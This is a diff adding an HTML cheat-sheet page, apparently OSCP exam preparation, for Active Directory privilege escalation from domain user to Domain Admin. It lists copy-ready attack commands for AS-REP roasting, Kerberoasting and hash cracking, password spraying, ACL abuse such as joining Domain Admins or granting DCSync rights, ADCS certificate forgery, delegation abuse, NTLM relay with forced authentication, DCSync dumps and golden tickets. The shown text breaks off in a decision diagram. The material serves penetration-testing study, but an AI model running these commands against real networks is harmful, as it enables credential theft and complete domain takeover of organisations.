@@ -1,0 +1,1066 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>PRIVESC_PATTERN_BANK // ad · user → da</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Big+Shoulders+Stencil+Text:wght@400;700;900&family=JetBrains+Mono:wght@300;400;500;700;800&family=IBM+Plex+Sans:wght@300;400;500;600&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --bg-base: #0a0d12; --bg-elev: #11151c; --bg-card: #0f1219; --bg-card-hover: #141823;
+    --border: #1d2230; --border-strong: #2a3145;
+    --text: #d8dde6; --text-dim: #8b94a7; --text-faint: #4a5266;
+    --setup: #ffb547; --setup-soft: #ffb54720;
+    --access: #ff6b6b; --access-soft: #ff6b6b18;
+    --enum: #5ec3e3; --enum-soft: #5ec3e318;
+    --abuse: #d96cd9; --abuse-soft: #d96cd918;
+    --win: #5fd49b; --win-soft: #5fd49b18;
+    --warn: #ff6b6b; --warn-soft: #ff6b6b18;
+    --theme: var(--abuse); --theme-soft: var(--abuse-soft);
+  }
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  html, body {
+    background: var(--bg-base); color: var(--text);
+    font-family: 'IBM Plex Sans', -apple-system, sans-serif;
+    font-size: 14px; line-height: 1.5; min-height: 100vh;
+    background-image: radial-gradient(circle at 15% 20%, rgba(217, 108, 217, 0.05) 0%, transparent 40%), radial-gradient(circle at 85% 80%, rgba(95, 212, 155, 0.03) 0%, transparent 40%);
+    background-attachment: fixed;
+  }
+  body::before { content: ''; position: fixed; inset: 0; pointer-events: none;
+    background: repeating-linear-gradient(0deg, rgba(255,255,255,0.012) 0px, rgba(255,255,255,0.012) 1px, transparent 1px, transparent 3px); z-index: 1; }
+  ::selection { background: var(--theme); color: var(--bg-base); }
+  ::-webkit-scrollbar { width: 8px; height: 8px; }
+  ::-webkit-scrollbar-track { background: var(--bg-base); }
+  ::-webkit-scrollbar-thumb { background: var(--border-strong); }
+  ::-webkit-scrollbar-thumb:hover { background: var(--text-faint); }
+  a { color: inherit; text-decoration: none; }
+
+  .header { position: sticky; top: 0; z-index: 100; background: rgba(10, 13, 18, 0.94); backdrop-filter: blur(12px); border-bottom: 1px solid var(--border); padding: 16px 28px 12px; }
+  .header-top { display: flex; align-items: baseline; justify-content: space-between; gap: 20px; margin-bottom: 12px; }
+  .brand { font-family: 'Big Shoulders Stencil Text', sans-serif; font-weight: 900; font-size: 30px; letter-spacing: 0.08em; line-height: 0.9; text-transform: uppercase; }
+  .brand .ad { color: var(--theme); }
+  .brand-tag { font-family: 'JetBrains Mono', monospace; font-size: 10px; color: var(--text-faint); letter-spacing: 0.15em; text-transform: uppercase; margin-top: 4px; }
+  .meta { text-align: right; font-family: 'JetBrains Mono', monospace; font-size: 10px; color: var(--text-faint); letter-spacing: 0.1em; }
+  .meta .count { color: var(--win); font-weight: 700; }
+  .search-row { display: flex; gap: 12px; align-items: stretch; }
+  .search-box { flex: 1; position: relative; }
+  .search-input { width: 100%; background: var(--bg-card); border: 1px solid var(--border-strong); color: var(--text); font-family: 'JetBrains Mono', monospace; font-size: 14px; font-weight: 500; padding: 11px 90px 11px 36px; outline: none; transition: border-color 0.15s, box-shadow 0.15s; }
+  .search-input:focus { border-color: var(--theme); box-shadow: 0 0 0 3px var(--theme-soft); }
+  .search-input::placeholder { color: var(--text-faint); }
+  .search-prefix { position: absolute; left: 14px; top: 50%; transform: translateY(-50%); color: var(--theme); font-family: 'JetBrains Mono', monospace; font-weight: 700; pointer-events: none; }
+  .search-kbd { position: absolute; right: 12px; top: 50%; transform: translateY(-50%); display: flex; gap: 4px; pointer-events: none; }
+  .kbd { font-family: 'JetBrains Mono', monospace; font-size: 10px; color: var(--text-dim); background: var(--bg-base); border: 1px solid var(--border-strong); padding: 2px 6px; letter-spacing: 0.05em; }
+  .nav { margin-top: 12px; display: flex; gap: 4px; flex-wrap: wrap; align-items: center; }
+  .nav-label { font-family: 'JetBrains Mono', monospace; font-size: 10px; color: var(--text-faint); text-transform: uppercase; letter-spacing: 0.15em; margin-right: 8px; }
+  .nav a { font-family: 'JetBrains Mono', monospace; font-size: 10.5px; color: var(--text-dim); padding: 4px 10px; border: 1px solid var(--border-strong); text-transform: uppercase; letter-spacing: 0.08em; transition: all 0.12s; }
+  .nav a:hover { color: var(--text); border-color: var(--text-dim); }
+  .nav a[data-phase="setup"]:hover { color: var(--setup); border-color: var(--setup); }
+  .nav a[data-phase="access"]:hover { color: var(--access); border-color: var(--access); }
+  .nav a[data-phase="enum"]:hover { color: var(--enum); border-color: var(--enum); }
+  .nav a[data-phase="abuse"]:hover { color: var(--abuse); border-color: var(--abuse); }
+  .nav a[data-phase="win"]:hover { color: var(--win); border-color: var(--win); }
+
+  main { max-width: 1400px; margin: 0 auto; padding: 28px 28px 60px; position: relative; z-index: 2; }
+  .topology { background: var(--bg-card); border: 1px solid var(--border-strong); border-left: 3px solid var(--theme); padding: 16px 18px; margin-bottom: 32px; font-family: 'JetBrains Mono', monospace; font-size: 12px; color: var(--text-dim); line-height: 1.7; }
+  .topology h3 { font-size: 11px; color: var(--theme); letter-spacing: 0.18em; text-transform: uppercase; margin-bottom: 8px; font-family: 'JetBrains Mono', monospace; }
+  .topology code { color: var(--text); background: var(--bg-base); padding: 1px 5px; font-size: 11px; }
+
+  section.flow { margin-bottom: 56px; scroll-margin-top: 180px; }
+  .flow-head { display: flex; align-items: baseline; justify-content: space-between; gap: 16px; margin-bottom: 6px; padding-bottom: 8px; border-bottom: 1px solid var(--border-strong); }
+  .flow-num { font-family: 'JetBrains Mono', monospace; font-size: 11px; color: var(--text-faint); letter-spacing: 0.15em; }
+  .flow-title { font-family: 'JetBrains Mono', monospace; font-size: 22px; font-weight: 800; letter-spacing: 0.02em; flex: 1; }
+  .flow-trigger { font-family: 'JetBrains Mono', monospace; font-size: 11px; color: var(--text-faint); letter-spacing: 0.05em; text-align: right; max-width: 360px; }
+  .flow-trigger strong { color: var(--theme); font-weight: 500; }
+  .flow-intro { font-size: 13px; color: var(--text-dim); margin-bottom: 18px; max-width: 850px; line-height: 1.65; }
+  .flow-intro code { font-family: 'JetBrains Mono', monospace; font-size: 11.5px; color: var(--text); background: var(--bg-card); padding: 1px 5px; border: 1px solid var(--border); }
+
+  .reminder { display: inline-flex; align-items: center; gap: 6px; background: var(--bg-card); border: 1px dashed var(--border-strong); padding: 6px 12px; font-family: 'JetBrains Mono', monospace; font-size: 10.5px; color: var(--text-dim); margin: 8px 8px 8px 0; }
+  .reminder.timing { border-left: 2px solid var(--setup); }
+  .reminder.flag { border-left: 2px solid var(--win); color: var(--win); }
+  .reminder.danger { border-left: 2px solid var(--warn); color: var(--warn); }
+  .reminder::before { font-weight: 800; color: inherit; }
+  .reminder.timing::before { content: '⏱'; }
+  .reminder.flag::before { content: '⚑'; }
+  .reminder.danger::before { content: '⚠'; }
+
+  .diagram { background: var(--bg-card); border: 1px solid var(--border); padding: 20px 16px; margin: 18px 0 22px; overflow-x: auto; }
+  .diagram svg { display: block; width: 100%; height: auto; }
+  .diagram svg .node-rect { fill: var(--bg-base); stroke: var(--border-strong); stroke-width: 1.2; transition: stroke 0.15s, fill 0.15s; }
+  .diagram svg a:hover .node-rect { fill: var(--bg-card-hover); stroke: var(--text-dim); cursor: pointer; }
+  .diagram svg .node-rect.setup  { stroke: var(--setup); }
+  .diagram svg .node-rect.access { stroke: var(--access); }
+  .diagram svg .node-rect.enum   { stroke: var(--enum); }
+  .diagram svg .node-rect.abuse  { stroke: var(--abuse); }
+  .diagram svg .node-rect.win    { stroke: var(--win); }
+  .diagram svg .node-rect.warn   { stroke: var(--warn); stroke-dasharray: 4 3; }
+  .diagram svg .node-text { fill: var(--text); font-family: 'JetBrains Mono', monospace; font-size: 11px; font-weight: 600; text-anchor: middle; pointer-events: none; }
+  .diagram svg .node-sub { fill: var(--text-faint); font-family: 'JetBrains Mono', monospace; font-size: 9px; text-anchor: middle; pointer-events: none; }
+  .diagram svg .arrow { stroke: var(--text-faint); stroke-width: 1.2; fill: none; marker-end: url(#arrowhead); }
+  .diagram svg .arrow-strong { stroke: var(--text-dim); stroke-width: 1.5; fill: none; marker-end: url(#arrowhead-strong); }
+  .diagram svg .label { fill: var(--text-faint); font-family: 'JetBrains Mono', monospace; font-size: 9px; text-anchor: middle; pointer-events: none; }
+  .diagram svg .group-bg { fill: rgba(217, 108, 217, 0.04); stroke: var(--border); stroke-dasharray: 3 3; stroke-width: 1; }
+  .diagram svg .group-label { fill: var(--text-faint); font-family: 'JetBrains Mono', monospace; font-size: 9px; text-transform: uppercase; letter-spacing: 0.15em; }
+
+  .cards-section { margin-top: 60px; padding-top: 24px; border-top: 1px solid var(--border-strong); scroll-margin-top: 180px; }
+  .filters { display: flex; gap: 6px; flex-wrap: wrap; align-items: center; margin: 14px 0 20px; }
+  .filter-label { font-family: 'JetBrains Mono', monospace; font-size: 10px; color: var(--text-faint); text-transform: uppercase; letter-spacing: 0.15em; margin-right: 4px; }
+  .pill { font-family: 'JetBrains Mono', monospace; font-size: 10.5px; font-weight: 500; color: var(--text-dim); background: transparent; border: 1px solid var(--border-strong); padding: 5px 12px; cursor: pointer; text-transform: uppercase; letter-spacing: 0.08em; transition: all 0.12s; user-select: none; }
+  .pill:hover { border-color: var(--text-dim); color: var(--text); }
+  .pill.active { background: var(--theme); color: var(--bg-base); border-color: var(--theme); font-weight: 700; }
+  .pill .pill-count { opacity: 0.65; margin-left: 4px; font-weight: 400; }
+  .pill.active .pill-count { opacity: 0.7; }
+
+  .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(380px, 1fr)); gap: 14px; }
+  .card { background: var(--bg-card); border: 1px solid var(--border); padding: 15px 15px 13px; position: relative; transition: border-color 0.15s, background 0.15s; display: flex; flex-direction: column; gap: 9px; scroll-margin-top: 200px; }
+  .card:hover { border-color: var(--border-strong); background: var(--bg-card-hover); }
+  .card[data-phase="setup"]  { border-left: 3px solid var(--setup); }
+  .card[data-phase="access"] { border-left: 3px solid var(--access); }
+  .card[data-phase="enum"]   { border-left: 3px solid var(--enum); }
+  .card[data-phase="abuse"]  { border-left: 3px solid var(--abuse); }
+  .card[data-phase="win"]    { border-left: 3px solid var(--win); }
+  .card.flash { animation: flash 1.2s ease-out; }
+  @keyframes flash { 0%, 30% { background: var(--theme-soft); border-color: var(--theme); } 100% { background: var(--bg-card); border-color: var(--border); } }
+  .card-head { display: flex; justify-content: space-between; align-items: flex-start; gap: 8px; }
+  .card-cat { font-family: 'JetBrains Mono', monospace; font-size: 9px; text-transform: uppercase; letter-spacing: 0.15em; padding: 2px 6px; border: 1px solid; flex-shrink: 0; white-space: nowrap; }
+  .card[data-phase="setup"]  .card-cat { color: var(--setup); border-color: var(--setup); }
+  .card[data-phase="access"] .card-cat { color: var(--access); border-color: var(--access); }
+  .card[data-phase="enum"]   .card-cat { color: var(--enum); border-color: var(--enum); }
+  .card[data-phase="abuse"]  .card-cat { color: var(--abuse); border-color: var(--abuse); }
+  .card[data-phase="win"]    .card-cat { color: var(--win); border-color: var(--win); }
+  .card-title { font-family: 'JetBrains Mono', monospace; font-size: 13.5px; font-weight: 700; color: var(--text); line-height: 1.3; flex: 1; }
+  .triggers { display: flex; flex-wrap: wrap; gap: 4px; }
+  .trigger { font-family: 'JetBrains Mono', monospace; font-size: 10px; color: var(--theme); background: var(--theme-soft); border: 1px solid var(--theme-soft); padding: 2px 7px; letter-spacing: 0.02em; }
+  .trigger.match { background: var(--theme); color: var(--bg-base); font-weight: 700; }
+  .arrow-line { display: flex; align-items: flex-start; gap: 8px; padding: 8px 10px; background: var(--bg-base); border: 1px solid var(--border); }
+  .arrow { color: var(--win); font-family: 'JetBrains Mono', monospace; font-weight: 800; flex-shrink: 0; }
+  .action { color: var(--text); font-size: 12.5px; line-height: 1.5; }
+  .cmd-wrap { position: relative; }
+  .cmd { font-family: 'JetBrains Mono', monospace; font-size: 11px; color: var(--text); background: var(--bg-base); border: 1px solid var(--border); padding: 9px 36px 9px 11px; white-space: pre-wrap; word-break: break-all; line-height: 1.5; overflow-x: auto; }
+  .cmd-copy { position: absolute; top: 4px; right: 4px; background: var(--bg-card); border: 1px solid var(--border-strong); color: var(--text-dim); font-family: 'JetBrains Mono', monospace; font-size: 9px; padding: 3px 6px; cursor: pointer; text-transform: uppercase; letter-spacing: 0.1em; opacity: 0; transition: opacity 0.15s, color 0.15s; }
+  .cmd-wrap:hover .cmd-copy { opacity: 1; }
+  .cmd-copy:hover { color: var(--theme); }
+  .cmd-copy.copied { color: var(--win); border-color: var(--win); opacity: 1; }
+  .cleanup { background: var(--warn-soft); border: 1px solid var(--warn); border-left-width: 3px; padding: 8px 11px; font-family: 'JetBrains Mono', monospace; font-size: 11px; color: var(--text); line-height: 1.5; white-space: pre-wrap; word-break: break-all; }
+  .cleanup-label { color: var(--warn); font-size: 9px; text-transform: uppercase; letter-spacing: 0.15em; display: block; margin-bottom: 4px; font-weight: 700; }
+  .card-foot { display: flex; justify-content: space-between; align-items: center; gap: 8px; margin-top: auto; padding-top: 4px; border-top: 1px dashed var(--border); font-family: 'JetBrains Mono', monospace; font-size: 10px; color: var(--text-faint); }
+  .state-tag { color: var(--text-dim); border: 1px solid var(--border); padding: 1px 6px; font-size: 9px; letter-spacing: 0.1em; }
+  .state-tag.user { color: var(--setup); border-color: var(--setup); }
+  .state-tag.admin { color: var(--access); border-color: var(--access); }
+  .state-tag.both { color: var(--text-dim); border-color: var(--border-strong); }
+  mark { background: var(--theme); color: var(--bg-base); padding: 0 2px; font-weight: 700; }
+  .empty { text-align: center; padding: 80px 20px; color: var(--text-faint); font-family: 'JetBrains Mono', monospace; }
+  .empty-icon { font-size: 48px; color: var(--border-strong); margin-bottom: 16px; }
+  .empty-title { color: var(--text-dim); font-size: 14px; margin-bottom: 6px; text-transform: uppercase; letter-spacing: 0.15em; }
+  .empty-hint { font-size: 12px; color: var(--text-faint); }
+  .anti-list { display: grid; grid-template-columns: repeat(auto-fill, minmax(400px, 1fr)); gap: 12px; margin-top: 18px; }
+  .anti { background: var(--bg-card); border: 1px solid var(--border); border-left: 3px solid var(--warn); padding: 12px 14px; }
+  .anti-bad { font-family: 'JetBrains Mono', monospace; font-size: 12px; color: var(--warn); margin-bottom: 4px; line-height: 1.4; }
+  .anti-bad::before { content: '✗ '; font-weight: 800; }
+  .anti-fix { font-size: 12px; color: var(--text-dim); line-height: 1.5; }
+  .anti-fix::before { content: '→ '; color: var(--win); font-weight: 800; }
+  .foot-info { margin-top: 60px; padding-top: 20px; border-top: 1px solid var(--border); font-family: 'JetBrains Mono', monospace; font-size: 10px; color: var(--text-faint); text-align: center; line-height: 1.8; letter-spacing: 0.05em; }
+  .foot-info code { color: var(--theme); background: var(--theme-soft); padding: 1px 5px; }
+  .checklist { background: var(--bg-card); border: 1px solid var(--border); padding: 18px 22px; margin: 14px 0 22px; }
+  .checklist-title { font-family: 'JetBrains Mono', monospace; font-size: 11px; color: var(--theme); letter-spacing: 0.18em; text-transform: uppercase; margin-bottom: 12px; }
+  .checklist ul { list-style: none; display: grid; grid-template-columns: repeat(auto-fill, minmax(320px, 1fr)); gap: 4px 18px; }
+  .checklist li { font-family: 'JetBrains Mono', monospace; font-size: 12px; padding: 5px 0; color: var(--text); display: flex; align-items: flex-start; gap: 9px; line-height: 1.5; cursor: pointer; user-select: none; }
+  .checklist li::before { content: '[ ]'; color: var(--text-faint); font-weight: 700; flex-shrink: 0; transition: color 0.15s; }
+  .checklist li.done { color: var(--text-faint); text-decoration: line-through; }
+  .checklist li.done::before { content: '[✓]'; color: var(--win); }
+  .checklist li code { color: var(--theme); font-size: 11px; }
+  @media (max-width: 720px) {
+    .header { padding: 12px 14px 10px; }
+    main { padding: 18px 14px 40px; }
+    .brand { font-size: 22px; }
+    .grid { grid-template-columns: 1fr; }
+    .search-kbd { display: none; }
+    .flow-head { flex-direction: column; align-items: flex-start; }
+    .flow-trigger { text-align: left; max-width: 100%; }
+  }
+</style>
+</head>
+<body>
+
+<header class="header">
+  <div class="header-top">
+    <div>
+      <div class="brand">PRIVESC<span class="ad">_</span>PATTERN<span class="ad">_</span>BANK</div>
+      <div class="brand-tag">// oscp · ad privesc · domain user → domain admin</div>
+    </div>
+    <div class="meta">
+      <div>SHOWING <span class="count" id="resultCount">0</span> / <span id="totalCount">0</span></div>
+      <div style="margin-top:4px; opacity:0.6">v1 · privesc · companion to enum + pivot banks</div>
+    </div>
+  </div>
+  <div class="search-row">
+    <div class="search-box">
+      <span class="search-prefix">▸</span>
+      <input id="search" class="search-input" type="text" autocomplete="off" spellcheck="false"
+        placeholder="search trigger: 'kerberoast', 'genericall', 'rbcd', 'esc1', 'dcsync', 'unconstrained', 'asrep' ..." />
+      <span class="search-kbd"><kbd class="kbd">⌘</kbd><kbd class="kbd">K</kbd></span>
+    </div>
+  </div>
+  <div class="nav">
+    <span class="nav-label">JUMP:</span>
+    <a href="#preauth" data-phase="abuse">pre-auth</a>
+    <a href="#lateral" data-phase="access">lateral</a>
+    <a href="#acl" data-phase="abuse">acl-abuse</a>
+    <a href="#deleg" data-phase="abuse">delegation</a>
+    <a href="#adcs" data-phase="abuse">adcs</a>
+    <a href="#endgame" data-phase="win">end-game</a>
+    <a href="#cards" style="margin-left:auto">all-cards</a>
+  </div>
+</header>
+
+<main>
+
+<div class="topology">
+  <h3>SCOPE · DOMAIN PRIVILEGE ESCALATION</h3>
+  <div>
+    <code>start</code>: nothing / username only / domain user creds ·
+    <code>end</code>: <span style="color:var(--win)">Domain Admin or DCSync</span> ·
+    <code>not covered</code>: local Windows priv-esc (separate bank) ·
+    <code>rule</code>: BloodHound first — it tells you which of these paths actually exists in this domain
+  </div>
+</div>
+
+<!-- METHODOLOGY CHECKLIST -->
+<section>
+  <div class="flow-head">
+    <div style="display:flex; gap:14px; align-items:baseline">
+      <span class="flow-num">[ 00 ]</span>
+      <span class="flow-title" style="color:var(--theme)">METHODOLOGY CHECKLIST · AD PRIVESC</span>
+    </div>
+    <div class="flow-trigger">click to mark done · resets on reload</div>
+  </div>
+  <p class="flow-intro">
+    Run in order of effort-to-payoff. Pre-auth attacks first (free with just a username), then ACL/Kerberos with creds. BloodHound drives everything — mark Owned after every cred, re-query shortest path. ADCS and delegation are high-payoff but need more setup.
+  </p>
+
+  <div class="checklist">
+    <div class="checklist-title">▸ 0. BLOODHOUND — runs continuously as you gain creds</div>
+    <ul>
+      <li>Collect — <code>bloodhound-python -c All -d $DOMAIN -u &lt;user&gt; -p &lt;pwd&gt; -ns $DC --zip</code></li>
+      <li>Mark Owned — in BH UI, right-click each compromised user/host → Mark as Owned</li>
+      <li>Query — Analysis → Shortest Paths to Domain Admins from Owned Principals</li>
+      <li>Re-collect after every new cred — stale data misses new ACL paths</li>
+    </ul>
+
+    <div class="checklist-title" style="margin-top:14px">▸ 1. PRE-AUTH — username only required</div>
+    <ul>
+      <li>AS-REP roast — <code>impacket-GetNPUsers $DOMAIN/ -no-pass -usersfile users.txt -dc-ip $DC -format hashcat</code></li>
+      <li>Crack — <code>hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt</code></li>
+      <li>Password spray (check lockout first!) — <code>nxc smb $DC -u users.txt -p 'Password123' --no-bruteforce</code></li>
+      <li>Spray with username = password — <code>nxc smb $DC -u users.txt -p users.txt --no-bruteforce</code></li>
+    </ul>
+
+    <div class="checklist-title" style="margin-top:14px">▸ 2. KERBEROS ATTACKS — with valid creds</div>
+    <ul>
+      <li>Kerberoast — <code>impacket-GetUserSPNs $DOMAIN/&lt;user&gt;:&lt;pwd&gt; -dc-ip $DC -request -outputfile kerb.txt</code></li>
+      <li>Crack TGS — <code>hashcat -m 13100 kerb.txt /usr/share/wordlists/rockyou.txt</code></li>
+      <li>Targeted Kerberoast (GenericWrite/All on SPN acct) — <code>targetedKerberoast.py -d $DOMAIN -u &lt;user&gt; -p &lt;pwd&gt; --dc-ip $DC</code></li>
+    </ul>
+
+    <div class="checklist-title" style="margin-top:14px">▸ 3. ACL ABUSE — from BloodHound edges</div>
+    <ul>
+      <li>GenericAll on user → force-change password — <code>net rpc password "&lt;target&gt;" "NewPwd123!" -U "$DOMAIN/&lt;you&gt;%&lt;pwd&gt;" -S $DC</code></li>
+      <li>GenericAll on group → add yourself — <code>net rpc group addmem "Domain Admins" "&lt;you&gt;" -U "$DOMAIN/&lt;you&gt;%&lt;pwd&gt;" -S $DC</code></li>
+      <li>GenericWrite on user → targeted Kerberoast — <code>targetedKerberoast.py -d $DOMAIN -u &lt;user&gt; -p &lt;pwd&gt;</code> · or ShadowCredentials — <code>certipy shadow auto -u "&lt;user&gt;@$DOMAIN" -p "&lt;pwd&gt;" -account "&lt;target&gt;"</code></li>
+      <li>WriteDACL → grant DCSync rights — <code>impacket-dacledit "$DOMAIN/&lt;you&gt;:&lt;pwd&gt;" -action write -rights DCSync -principal &lt;you&gt; -target-dn "DC=&lt;domain&gt;,DC=local" -dc-ip $DC</code></li>
+      <li>ForceChangePassword — <code>impacket-changepasswd $DOMAIN/&lt;target&gt;:FakeOld@$DC -newpass NewPwd123! -authtype ntlm</code> or via PowerView</li>
+      <li>AddMember (WriteMember on group) — <code>net rpc group addmem "&lt;group&gt;" "&lt;you&gt;" -U "$DOMAIN/&lt;you&gt;%&lt;pwd&gt;" -S $DC</code></li>
+      <li>ReadGMSAPassword — <code>nxc ldap $DC -u &lt;user&gt; -p &lt;pwd&gt; --gmsa</code></li>
+      <li>ReadLAPSPassword — <code>nxc ldap $DC -u &lt;user&gt; -p &lt;pwd&gt; -M laps</code></li>
+    </ul>
+
+    <div class="checklist-title" style="margin-top:14px">▸ 4. ADCS — certipy (enumerate then attack)</div>
+    <ul>
+      <li>Find vulnerable templates — <code>certipy find -u "&lt;user&gt;@$DOMAIN" -p "&lt;pwd&gt;" -dc-ip $DC -vulnerable</code></li>
+      <li>ESC1 (enroll + subjectAltName) — <code>certipy req -u "&lt;user&gt;@$DOMAIN" -p "&lt;pwd&gt;" -ca "&lt;CA-name&gt;" -template "&lt;template&gt;" -upn "administrator@$DOMAIN" -dc-ip $DC</code></li>
+      <li>Authenticate with cert — <code>certipy auth -pfx administrator.pfx -dc-ip $DC</code> → gets NT hash</li>
+      <li>PtH or PtT with the hash/TGT — <code>impacket-psexec &lt;user&gt;@&lt;IP&gt; -hashes :&lt;NT&gt;</code> or <code>export KRB5CCNAME=&lt;ticket.ccache&gt;; impacket-psexec -k -no-pass &lt;target&gt;</code></li>
+    </ul>
+
+    <div class="checklist-title" style="margin-top:14px">▸ 5. DELEGATION ABUSE</div>
+    <ul>
+      <li>Find unconstrained — BH query: <code>MATCH (c:Computer {unconstraineddelegation:true}) WHERE NOT c.name CONTAINS 'DC' RETURN c</code></li>
+      <li>Unconstrained: wait for admin to connect (or force via printerbug) → dump TGT — <code>mimikatz # sekurlsa::tickets /export</code></li>
+      <li>Find constrained — BH: "Shortest Paths to Kerberoastable Users" / <code>GetUserSPNs -request-user &lt;target&gt;</code></li>
+      <li>Constrained S4U2Proxy — <code>impacket-getST $DOMAIN/&lt;svc&gt;:&lt;pwd&gt; -spn cifs/&lt;target&gt; -impersonate administrator -dc-ip $DC</code></li>
+      <li>RBCD (WriteMSDS-AllowedToActOnBehalfOfOtherIdentity) — <code>impacket-rbcd -action write -delegate-to &lt;target$&gt; -delegate-from &lt;controlled$&gt; $DOMAIN/&lt;user&gt;:&lt;pwd&gt; -dc-ip $DC</code></li>
+    </ul>
+
+    <div class="checklist-title" style="margin-top:14px">▸ 6. NTLM RELAY</div>
+    <ul>
+      <li>Check SMB signing off on targets — <code>nxc smb &lt;subnet&gt;/24 --gen-relay-list relay-targets.txt</code></li>
+      <li>Start responder (no SMB/HTTP capture) — <code>sudo responder -I tun0 --no-smb-server --no-http-server</code></li>
+      <li>Start ntlmrelayx — <code>impacket-ntlmrelayx -tf relay-targets.txt -smb2support -socks</code></li>
+      <li>Force auth (printerbug) — <code>impacket-printerbug $DOMAIN/&lt;user&gt;:&lt;pwd&gt;@&lt;src&gt; &lt;KALI&gt;</code></li>
+      <li>Use SOCKS proxy — <code>proxychains nxc smb &lt;target&gt; -u '' -p '' -d $DOMAIN</code></li>
+    </ul>
+
+    <div class="checklist-title" style="margin-top:14px">▸ 7. END-GAME — from DA or DCSync rights</div>
+    <ul>
+      <li>DCSync — <code>impacket-secretsdump $DOMAIN/&lt;da-user&gt;:&lt;pwd&gt;@$DC -just-dc-ntlm</code></li>
+      <li>PtH as Administrator — <code>impacket-psexec administrator@$DC -hashes :&lt;NT&gt;</code></li>
+      <li>Golden ticket — <code>impacket-ticketer -nthash &lt;krbtgt-hash&gt; -domain-sid &lt;SID&gt; -domain $DOMAIN -groups 512,513 anyuser</code></li>
+      <li>Dump all secrets — <code>impacket-secretsdump $DOMAIN/administrator@$DC -hashes :&lt;NT&gt; -just-dc-ntlm</code></li>
+    </ul>
+  </div>
+  <div class="reminder timing">budget: 30 min per attack path — pivot if stuck, not stuck in the same tree</div>
+  <div class="reminder flag">BloodHound → mark Owned → re-query shortest path every time you get a new cred</div>
+  <div class="reminder danger">ForceChangePassword / AddMember are loud — log them in your notes for post-exam rollback</div>
+</section>
+
+<!-- DECISION FLOW -->
+<section id="preauth" class="flow">
+  <div class="flow-head">
+    <div style="display:flex; gap:14px; align-items:baseline">
+      <span class="flow-num">[ 01 ]</span>
+      <span class="flow-title" style="color:var(--theme)">DECISION FLOW · USER → DA</span>
+    </div>
+    <div class="flow-trigger">TRIGGER · <strong>"I have creds, what path to DA?"</strong></div>
+  </div>
+  <p class="flow-intro">
+    The map of every common path. BloodHound tells you which one applies. Branch based on what you have: just a username (pre-auth), domain user creds (Kerberos + ACL + ADCS), an account hash (PtH + spray), or admin somewhere (LSASS dump → keep climbing).
+  </p>
+
+  <div class="diagram">
+    <svg viewBox="0 0 1100 620" xmlns="http://www.w3.org/2000/svg">
+      <defs>
+        <marker id="arrowhead" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="6" markerHeight="6" orient="auto"><path d="M0,0 L10,5 L0,10 z" fill="#4a5266"/></marker>
+        <marker id="arrowhead-strong" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="6" markerHeight="6" orient="auto"><path d="M0,0 L10,5 L0,10 z" fill="#8b94a7"/></marker>
+      </defs>
+
+      <a href="#card-bh-mark"><rect class="node-rect abuse" x="440" y="10" width="220" height="50"/>
+        <text class="node-text" x="550" y="34">BLOODHOUND + MARK OWNED</text>
+        <text class="node-sub" x="550" y="48">find shortest path → DA</text></a>
+      <path class="arrow-strong" d="M 550 60 L 550 85"/>
+      <text class="label" x="550" y="80" style="font-size:9px">→ branch on what BH shows</text>
+
+      <!-- 4 branch columns -->
+      <rect class="group-bg" x="20" y="100" width="245" height="500"/>
+      <text class="group-label" x="40" y="120">KERBEROS PATHS</text>
+
+      <a href="#card-asrep"><rect class="node-rect abuse" x="35" y="135" width="215" height="44"/>
+        <text class="node-text" x="142" y="158">AS-REP roast</text>
+        <text class="node-sub" x="142" y="172">no pre-auth → hashcat 18200</text></a>
+
+      <a href="#card-kerberoast"><rect class="node-rect abuse" x="35" y="195" width="215" height="44"/>
+        <text class="node-text" x="142" y="218">Kerberoast</text>
+        <text class="node-sub" x="142" y="232">SPN account → hashcat 13100</text></a>
+
+      <a href="#card-spray"><rect class="node-rect abuse" x="35" y="255" width="215" height="44"/>
+        <text class="node-text" x="142" y="278">Password Spray</text>
+        <text class="node-sub" x="142" y="292">Season2024 / weak pwds</text></a>
+
+      <a href="#card-silver"><rect class="node-rect win" x="35" y="315" width="215" height="44"/>
+        <text class="node-text" x="142" y="338">Silver Ticket</text>
+        <text class="node-sub" x="142" y="352">service hash → access</text></a>
+
+      <rect class="group-bg" x="285" y="100" width="245" height="500"/>
+      <text class="group-label" x="305" y="120">ACL ABUSE</text>
+
+      <a href="#card-genericall-user"><rect class="node-rect abuse" x="300" y="135" width="215" height="44"/>
+        <text class="node-text" x="407" y="158">GenericAll on User</text>
+        <text class="node-sub" x="407" y="172">targeted Kerberoast / ShadowCred</text></a>
+
+      <a href="#card-genericall-group"><rect class="node-rect abuse" x="300" y="195" width="215" height="44"/>
+        <text class="node-text" x="407" y="218">GenericAll on Group</text>
+        <text class="node-sub" x="407" y="232">net group add → DA</text></a>
+
+      <a href="#card-writedacl"><rect class="node-rect abuse" x="300" y="255" width="215" height="44"/>
+        <text class="node-text" x="407" y="278">WriteDACL</text>
+        <text class="node-sub" x="407" y="292">add DCSync rights → dcsync</text></a>
+
+      <a href="#card-force-pwd"><rect class="node-rect abuse" x="300" y="315" width="215" height="44"/>
+        <text class="node-text" x="407" y="338">ForceChangePassword</text>
+        <text class="node-sub" x="407" y="352">reset victim password</text></a>
+
+      <a href="#card-gmsa"><rect class="node-rect abuse" x="300" y="375" width="215" height="44"/>
+        <text class="node-text" x="407" y="398">ReadGMSAPassword</text>
+        <text class="node-sub" x="407" y="412">gMSA NT hash</text></a>
+
+      <a href="#card-laps"><rect class="node-rect abuse" x="300" y="435" width="215" height="44"/>
+        <text class="node-text" x="407" y="458">ReadLAPSPassword</text>
+        <text class="node-sub" x="407" y="472">local admin pwd plaintext</text></a>
+
+      <rect class="group-bg" x="550" y="100" width="245" height="500"/>
+      <text class="group-label" x="570" y="120">DELEGATION</text>
+
+      <a href="#card-unconstrained"><rect class="node-rect abuse" x="565" y="135" width="215" height="44"/>
+        <text class="node-text" x="672" y="158">Unconstrained Deleg.</text>
